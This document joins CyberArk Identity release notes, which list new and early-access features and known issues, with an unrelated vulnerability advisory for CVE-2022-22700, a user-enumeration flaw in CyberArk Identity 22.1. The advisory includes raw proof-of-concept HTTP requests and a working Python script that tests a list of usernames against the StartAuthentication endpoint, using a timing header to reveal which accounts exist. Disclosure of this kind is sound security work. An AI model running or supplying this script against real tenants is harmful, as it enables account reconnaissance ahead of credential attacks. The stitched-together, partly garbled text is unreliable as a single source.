## What's new

The following new features are now available.

### Authentication

New features for authentication

| Feature | Description |
| --- | --- |
| Prompt user for phone PIN code enrollment | Previously, users could only enroll a PIN code for phone calls in the Authentication factors page, and many were unaware of this option or how to enable it. Now, you can require users to create a PIN code for phone-based authentication, prompting configuration through the wizard. These updates improve usability and strengthen protection against unauthorized access during phone-based authentication.  See [Enable phone PIN](../coreservices/authenticate/phonepin.htm) for more information. |
| Custom headers for the App Gateway | The new custom headers feature for the App Gateway allows administrators to set up to 10 custom headers, which enhances the flexibility and integration capabilities of on-premises applications. This feature reduces the need for additional backend API calls, which can reduce development costs and improve efficiency.  For more information, see [Configure an application to use App Gateway](../applications/appgateway-configure-app.htm). |
| Helpdesk identity verification with new mechanisms | Previously, an organizationâs Helpdesk representative could only verify a userâs identity using text messages (SMS). With this new enhancement they can now verify user identities with various mechanisms that improve convenience and security. These are the supported mechanisms:   * SMS * Phone call (PIN code required) * Email * OATH OTP Client * Mobile Authenticator   This reduces reliance on SMS, mitigates vulnerabilities, supports stronger MFA authentication methods, and ensures users can verify their identity even if one method is unavailable.  See [Verify helpdesk caller identity](../coreservices/usersroles/helpdeskidentityverification.htm) for more information. |

### Platform

New features for the platform

| Feature | Description |
| --- | --- |
| CyberArk Identity now supports Czech, Slovak and Romanian languages for the User Portal, CyberArk Identity mobile app (iOS and Android), the authentication widget, and email templates | Users can select the Czech, Slovak and Romanian languages in the User Portal > Account > Personal Profile > Language drop-down menu.  See [Foreign language support](../coreservices/getstarted/services-components-overview/languagesupport.htm) for more information. |

### Lifecycle management

New features for lifecycle management

| Feature | Description |
| --- | --- |
| Active Directory group filters for outbound provisioning | Administrators now have the option to use advanced filters for syncing Active Directory groups to SCIM applications. This feature also provides the option to sync the membership of each group directly to the target application without using role mapping. This enhancement provides greater flexibility and performance improvements by enabling selective group synchronization and membership syncing without the need for additional identity roles. For more information, see [Provision Active Directory Groups](../applications/appsovw/provusers_adgroups.htm). |

## Early access features

Early access features are made available on a case-by-case basis by request. Early access features might see more frequent updates compared to GA features.

Contact your account representative to enable early access features.

The following tables describe features that are currently in an early access state.

### Platform

Early access features for the platform

| Feature | Description | Initial release version |
| --- | --- | --- |
| CyberArk Identity now enables the use browser fingerprinting to secure AuthCookies | Previously, attackers could copy browser cookies to take over a session that impersonates a legitimate user. This new feature prevents attackers from copying AuthCookies to continue a session. When the attacker attempts to use a copied AuthCookie on a different machine or browser, the mismatch in browser fingerprinting prevents the attacker from logging in, and logs out the compromised session. When the Enable browser fingerprinting checkbox is selected, it provides an additional layer of security by ensuring that session AuthCookies cannot be reused on unauthorized devices or browsers.  See [Authentication security options](../coreservices/authenticate/authsecopt.htm) for more information. | 24.10 |
| The new API Gateway connects on-premise application RESTful APIs with the cloud | The new API Gateway enables secure machine-to-machine communication with on-premise application RESTful APIs. By using API keys for authentication, external services can access on-premise APIs without user intervention. The API Gateway enhances security by limiting access to specific endpoints on a restricted list. This prevents credential leaks and ensures only authorized identities can access the on-premise application APIs, making the API Gateway an essential tool for secure and efficient integration with external services.  See [API Gateway](../applications/api-gateway.htm) for more information. | 24.8 |
| Require registration code for connector activation | You can now require the use of a registration code to activate a connector. You can enable the use of a generated registration code instead of a username and password for registration of a connector. This streamlines the registration process and provides security against potential attacks. See [Install the CyberArk Identity Connector](../coreservices/connector/connector-install.htm) for more information. | 24.5 |

### CyberArk Identity mobile app

Early access features for the mobile app

| Feature | Description | Initial release version |
| --- | --- | --- |
| CyberArk Identity now supports a unified endpoint management (UEM) trust for managed mobile devices, which enhances the security of mobile applications on both Android and iOS devices using a supported third-party mobile device management (MDM) provider. | At this time, Microsoft Intune is supported for both Android and iOS devices. The mobile device trust enables admins to create authentication rules for native apps on managed mobile devices, such as requiring that devices are compliant or enrolled before they can open a protected application. For more information, see [Configure access based on a third-party UEM trust](../coreservices/authenticate/mfa-device-trust.htm). | 24.10 |

### Core services

Core services early access features

| Feature | Description | Initial release version |
| --- | --- | --- |
| Enhanced encryption handling for SAML assertions | CyberArk Identity now supports external IdPs that omit encryption certificate information in SAML responses. When the certificate data is missing, CyberArk Identity reads it directly from the metadata. This ensures seamless decryption and authentication without impacting existing federations. For more information on configuring an external IdP using SAML, see [Federate with an external IdP using SAML](../coreservices/usersroles/partneradd.htm). | 24.12 |
| Support for multiple configurations with the same IdP signing certificate | You can now configure the same IdP signing certificate for different child domains, even if they share the same IdP. This enhancement simplifies the configuration process for organizations managing multiple domains under a single IdP. It is particularly beneficial for complex domain setups, enabling you to streamline identity management without duplication errors. For more information on configuring an external IdP, see [Federate with an external IdP using SAML](../coreservices/usersroles/partneradd.htm). For more information on signing certificates, see [Manage tenant signing certificates](../coreservices/authenticate/signing-certificates.htm). | 24.11 |
| Persistent sessions for SAML federated users | SAML federated users can opt for persistent sessions using the Keep me signed in option in the Identity User Portal and the Browser Extension. This feature aligns with the policy for non-federated users to remain signed in for a specified duration, configurable in the authentication policy settings.  To configure Keep me signed in, see [To display Keep me signed in on the sign in screen:](../coreservices/authenticate/sesslengthcust.htm#SignedIn)  Existing users will see the Keep me signed in option if the policy is enabled. | 24.4 |

### Windows Cloud Agent

Windows Cloud Agent early access features

| Feature | Description | Initial release version |
| --- | --- | --- |
| Support for federated users and additional authentication options | The Windows Cloud Agent now supports a WebView component for the endpoint login UI, in addition to the native Windows Cloud Agent login UI.  The WebView-based experience offers all of the benefits of the native Windows Cloud Agent experience, plus the following advantages:   * support for federated users * enhanced authentication options   See [CyberArk Identity Windows Cloud Agent](../endpoints/enrollwindowsdevices.htm) for more information. | 24.2 |

### SSO

SSO early access features

| Improvement | Description | Initial release |
| --- | --- | --- |
| Custom headers for the Application Gateway | The new custom headers feature for the App Gateway allows administrators to set up to 10 custom headers, which enhances the flexibility and integration capabilities of on-premises applications. This feature reduces the need for additional backend API calls, which can reduce development costs and improve efficiency.  For more information, see [Configure an application to use App Gateway](../applications/appgateway-configure-app.htm). | 24.12 |
| Single logout (SLO) now includes external IdPs | With this release, federated users who log out of a SAML or OIDC web application are seamlessly logged out from the external IdP.  To configure SLO, see  [Configure Single Logout](../applications/appsovw/singlelogoutconfig.htm). | 23.11 |

### Customer Identity

Customer Identity early access features

| Feature | Description | Initial release version |
| --- | --- | --- |
| Monthly Active Users report and alerts | The Monthly Active Users (MAU) report is a built-in report that shows the MAU quota purchased and the number of active users per month. It tracks users who have logged in or signed up to CyberArk Identity or an external app for the selected period.  This report now indicates whether your purchased MAU plans are active or completed, and the number of remaining and consumed MAU reports for each plan. Administrators receive an email notification when the remaining MAUs drop below a configured percentage. The default is 30%. | 22.9 |

### Authentication

Authentication early access features

| Feature | Description | Initial release version |
| --- | --- | --- |
| New self-service password reset endpoint | You can now reset your password from a designated endpoint. You can embed the password reset URL in your solution and add a Close button. These new options provide greater control and flexibility in environments where security and efficient script management are critical while the Close button ensures that users can quickly and safely stop scripts that could impact system performance or security.  Go to Core Services > Policies, select a policy then go to User Security Policies > Self Service and select Yes in the Enable account self service controls drop-down menu.  See [Configure user self-service options](../coreservices/usersroles/selfserviceoptions.htm) for more information. | 24.9 |
| The browser now closes after successful Duo Universal Prompt log in | With this release, the browser tab automatically closes when users successfully authenticate using Duo Universal Prompt. Previously, users had to close the browser tab and return to the main login page. | 24.3 |
| Sign-in APIs now support multiple identifiers | CyberArk Cloud Directory users can now sign in to CyberArk Identity with their email address or phone number.  If an email address or phone number is used in multiple user accounts, sign-in will fail. | 22.3 |

## New single sign-on templates

New single sign-on (SSO) application templates are added to the CyberArk Identity Web App Catalog on a regular basis, independent of the product release schedule.

See [Recent SSO application templates](../applications/appsovw/web_toplevel.htm#Recent) for a list of recently added templates.

## Known issues

### Single sign-on

Known issues for single sign-on

| Issue | Description |
| --- | --- |
| Users may experience an app PIN error when the Identity mobile app for iOS transitions from running in the background to the foreground, especially after receiving a push notification. This error prevents successful login and can occur intermittently. When the error occurs on multiple retries, the app will not recover during the same app session. | To bypass this issue, users should close the mobile app completely and relaunch the app. |
| Single logout is not working for the Confluence and Aha apps. | Signing out of Confluence or Aha with single logout configured does not sign the user out of CyberArk Identity.  There is currently no workaround. |

### Mac Cloud Agent

Known issues for the MCA

| Issue | Workaround |
| --- | --- |
| The Mac Cloud Agent installer shows the [Gatekeeper](https://support.apple.com/en-us/HT202491) warning the first time it is installed on a device. | 1. Go to System Preferences > Security & Privacy > General, then click Open Anyway. 2. Click Open on the warning screen that appears.  After you make these changes, the Gatekeeper warning does not display again for the Mac Cloud Agent on that device for the logged in user. |
| The user may not able to see the device location. | Go to user policy Endpoint Policies > Common Settings > Mobile Settings > Restriction Settings, then under Report mobile device location, select Force for Permit administrator to see device location. Then unenroll the user and enroll again. |
| Mac login MFA options show FIDO2 and Radius if they were configured in the authentication profile; however, these MFA challenges are currently not supported. | Always make sure authentication challenges configured in the authentication profile are available to your users and configured for each user. |
| The CyberArk Menu Item is not removed from the UI after you unenroll until the next login or restart.  You might receive a certificate error during munkiimport after tenant migration. | Workaround: Re-enroll the Mac. |
| The Apple Device Enrollment Program (DEP) needs to be configured explicitly to work with the 19.6 Mac Cloud Agent. Contact support if you plan to use DEP. | None |

### CyberArk Identity mobile app

Known issues for the mobile app

| Issue | Workaround |
| --- | --- |
| For iOS devices running in the Zoom display mode (Settings > Display & Brightness > Display Zoom: 'Zoom'), the Mobile Authenticator code gets truncated. | Use only the Standard display mode. |
| When enrolling the CyberArk Identity mobile app on an Android device using a Google account, the Play Store doesn't redirect as expected, and installation is not completed. | Use work-profile mode and turn off Enable third-party Android mobile management from the Google Administration console. Then the app installs from Play Store. |

## System requirements

See [System requirements and supported browsers](../coreservices/getstarted/services-components-overview/browserssupport.htm) for more information about browser and device support.

# CyberArk Identity 22.1 - User Enumeration

## Summary

|  |  |
| --- | --- |
| **Name** | CyberArk Identity 22.1 User Enumeration |
| **Code name** | [Porter](https://en.wikipedia.org/wiki/Cole_Porter) |
| **Product** | CyberArk Identity |
| **Affected versions** | 22.1 and below |
| **Fixed Versions** | 22.2 |
| **State** | Public |
|

## Vulnerability

|  |  |
| --- | --- |
| **Kind** | User Enumeration |
| **Rule** | [225. Proper Authentication Responses](https://docs.fluidattacks.com/criteria/requirements/225) |
| **Remote** | Yes |
| **CVSSv3.1 Vector** | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N |
| **CVSSv3.1 Base Score** | 5.3 |
| **Exploit available** | Yes |
| **CVE ID(s)** | [CVE-2022-22700](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-22700) |

## Description

CyberArk Identity versions up to and including 22.1 in the
`StartAuthentication` resource, exposes the response header `X-CFY-TX-TM`.
In certain configurations, that response header contains different, predictable
value ranges which can be used to determine wether a user exists in the tenant.

## Proof of Concept

* A request is sent with a known valid user

Request:

```
POST /Security/StartAuthentication HTTP/1.1
Host: customer.my.idaptive.app
Content-Length: 143
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36
Content-Type: application/json

{"TenantId":"","User":"admin@customer.com","Version":"1.0","AssociatedEntityType":"Portal","AssociatedEntityName":"Portal","ZsoSessionId":""}

```

Response:

```
HTTP/1.1 200 OK
Cache-Control: no-cache, no-store, must-revalidate
Pragma: no-cache
Content-Type: application/json; charset=utf-8
X-CFY-TX-TM: 109
...

```

In the cases when the user exists, the value of `X-CFY-TX-TM`
is always less than `500`.

* A request is sent with a non existent user

Request:

```
POST /Security/StartAuthentication HTTP/1.1
Host: customer.my.idaptive.app
Content-Length: 147
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36
Content-Type: application/json

{"TenantId":"","User":"notexists@customer.com","Version":"1.0","AssociatedEntityType":"Portal","AssociatedEntityName":"Portal","ZsoSessionId":""}

```

Response:

```
HTTP/1.1 200 OK
Cache-Control: no-cache, no-store, must-revalidate
Pragma: no-cache
Content-Type: application/json; charset=utf-8
X-CFY-TX-TM: 1492
...

```

In the cases when the user does not exist, the value of `X-CFY-TX-TM`
is always above than `1000`.

## Exploit

The following code was used to enumerate valid users:

```
#!/usr/bin/env python
#
# Author: aroldan@fluidattacks.com

import json
import requests
import sys

URL = 'https://<customer>.my.idaptive.app/Security/StartAuthentication'
RAW_DATA =  '{"TenantId":"","User":"test@customer.com","Version":"1.0","AssociatedEntityType":"Portal","AssociatedEntityName":"Portal","ZsoSessionId":""}'
JSON_DATA = json.loads(RAW_DATA)

with open(sys.argv[1], 'r') as fd:
    USERS = [x.rstrip() for x in fd.readlines()]

for USER in USERS:
    VALUE = 10000
    PAYLOAD = JSON_DATA
    PAYLOAD['User'] = USER
    RESP = requests.post(URL, json=PAYLOAD)
    if 'X-CFY-TX-TM' in RESP.headers:
        VALUE = int(RESP.headers['X-CFY-TX-TM'])
    if VALUE < 1000:
        print(VALUE)
        print(f'[+] User {USER} exists.')
    else:
        print(f'[-] User {USER} not exists.')

```
